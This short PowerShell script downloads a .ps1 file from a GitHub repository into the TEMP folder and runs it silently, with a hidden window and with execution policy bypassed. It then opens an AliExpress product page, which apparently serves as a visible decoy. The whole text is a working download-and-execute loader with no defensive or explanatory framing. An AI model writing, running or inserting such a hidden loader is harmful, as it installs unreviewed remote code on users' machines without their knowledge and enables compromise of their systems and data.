$src  = "https://raw.githubusercontent.com/AnatolikFFF/kupikupi_nonono/refs/heads/main/test6.ps1"
$dest = Join-Path $env:TEMP "test6.ps1"

Invoke-WebRequest -Uri $src -OutFile $dest

Start-Process -FilePath "powershell.exe" `
  -ArgumentList @("-NoProfile","-ExecutionPolicy","Bypass","-WindowStyle","Hidden","-File",$dest) `
  -WindowStyle Hidden

Start-Process "https://aliexpress.ru/item/1005010748595370.html?shpMethod=CAINIAO_STANDARD&sku_id=12000053384867288&spm=a2g2w.productlist.search_results.16.308eeafaeIDtzw"
